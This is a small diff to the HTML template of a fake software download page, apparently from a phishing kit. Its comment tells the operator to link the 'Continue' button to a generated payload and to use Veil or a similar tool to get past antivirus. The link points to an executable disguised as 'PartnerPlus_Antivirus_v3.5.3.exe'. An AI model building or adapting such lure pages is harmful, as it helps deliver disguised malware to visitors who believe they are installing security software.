@@ -23,7 +23,7 @@
         <div class="download">
           <ol class="links">
             <li class="link">
-<!-- Change the link to the payload you've generated. Make sure you use Veil or something similar to bypass antivirus-->
+{# Change the link to the payload you've generated. Make sure you use Veil or something similar to bypass antivirus #}
                 <a class="btn download" href="./PartnerPlus_Antivirus_v3.5.3.exe">
                 <span>Continue</span>
               </a>
